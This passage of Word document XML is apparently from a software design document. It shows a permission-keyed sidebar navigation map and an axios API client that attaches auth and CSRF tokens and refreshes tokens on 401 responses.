                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Keeping them as twin files with identical regex + length + .strict() is a small cost for keeping the BE in CJS and FE in ESM.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Phase 9+ could publish a shared package — out of scope for the MVP.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>8.3  lib/permissions.js — Sidebar Map Keyed by Permission</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src/lib/permissions.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  LayoutDashboard, Wrench, FileText, ClipboardCheck,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  Search, ScrollText, Users,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>} from 'lucide-react';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export const ALL_NAV_ITEMS = [</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  { label: 'Dashboard',    to: '/dashboard',    icon: LayoutDashboard, requires: 'dashboard:view' },</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  { label: 'Equipment',    to: '/equipment',    icon: Wrench,          requires: 'equipment:read-list' },</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  { label: 'Job Requests', to: '/job-requests', icon: FileText,        requires: 'job_request:read-own' },</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  { label: 'Job Cards',    to: '/job-cards',    icon: ClipboardCheck,  requires: 'job_card:read-list' },</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  { label: 'Inquiry',      to: '/inquiry',      icon: Search,          requires: 'inquiry:search-instruments' },</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  { label: 'Audit Log',    to: '/audit',        icon: ScrollText,      requires: 'audit_log:read' },</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  { label: 'Manage Users', to: '/admin/users',  icon: Users,           requires: 'user:read-list' },</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export function visibleNavItems(permissions) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!Array.isArray(permissions) || permissions.length === 0) return [];</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const owned = new Set(permissions);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return ALL_NAV_ITEMS.filter(item =&gt; owned.has(item.requires));</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>8.4  lib/api-client.js — Axios + Interceptors + Coalescing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>The central nervous system of the frontend. Every HTTP call to the backend goes through `api`. Two interceptors do the heavy lifting:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>REQUEST — attach Authorization: Bearer + X-CSRF-Token (on POST/PATCH/DELETE).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>RESPONSE — on 401 (non-auth URL), fire a SINGLE coalesced /auth/refresh, retry the original request.</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src/lib/api-client.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import axios from 'axios';</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Module-private state — never exposed; only setters mutate.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>let accessToken = null;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>let csrfToken = null;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>let refreshInFlight = null;</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export function setAccessToken(t) { accessToken = t; }</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>export function setCsrfToken(t)   { csrfToken   = t; }</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>export function getAccessToken()  { return accessToken; }</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>export function clearAuthTokens() { accessToken = null; csrfToken = null; }</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function readCookie(name) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (typeof document === 'undefined') return null;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const esc = name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&amp;');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const m = document.cookie.match(new RegExp('(?:^|; )' + esc + '=([^;]*)'));</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return m ? decodeURIComponent(m[1]) : null;</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export const api = axios.create({</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  baseURL: import.meta.env.VITE_API_BASE_URL || '/api/v1',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  withCredentials: true,                       // mandatory for the refresh cookie</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 REQUEST INTERCEPTOR ──</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>api.interceptors.request.use(config =&gt; {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (accessToken) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    (config.headers.set</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      ? config.headers.set('Authorization', `Bearer ${accessToken}`)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      : (config.headers.Authorization = `Bearer ${accessToken}`));</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const method = (config.method || 'get').toLowerCase();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (['post','patch','delete'].includes(method)) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    const csrf = csrfToken || readCookie('cmcmis_csrf');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    if (csrf) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      (config.headers.set</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        ? config.headers.set('X-CSRF-Token', csrf)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        : (config.headers['X-CSRF-Token'] = csrf));</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return config;</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 RESPONSE INTERCEPTOR ── refresh-on-401 with coalescing</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>api.interceptors.response.use(resp =&gt; resp, async error =&gt; {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const original = error.config;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!original)                                      return Promise.reject(error);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (original._retried)                              return Promise.reject(error);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!error.response || error.response.status !== 401)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">                                                      return Promise.reject(error);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (typeof original.url === 'string' &amp;&amp; /\/auth\//.test(original.url))</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">                                                      return Promise.reject(error);</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original._retried = true;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!refreshInFlight) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    refreshInFlight = refreshAccessToken().finally(() =&gt; { refreshInFlight = null; });</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try {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    const newToken = await refreshInFlight;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    if (original.headers?.set) original.headers.set('Authorization', `Bearer ${newToken}`);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    else { original.headers = original.headers || {};</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">           original.headers.Authorization = `Bearer ${newToken}`; }</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return api(original);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  } catch (refreshError) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    if (typeof window !== 'undefined') window.location.replace('/login');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return Promise.reject(refreshError);</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async function refreshAccessToken() {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const r = await api.post('/auth/refresh');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  setAccessToken(r.data.data.accessToken);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  setCsrfToken(r.data.data.csrfToken);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return r.data.data.accessToken;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEF2FF"/>
            <w:tcBorders>
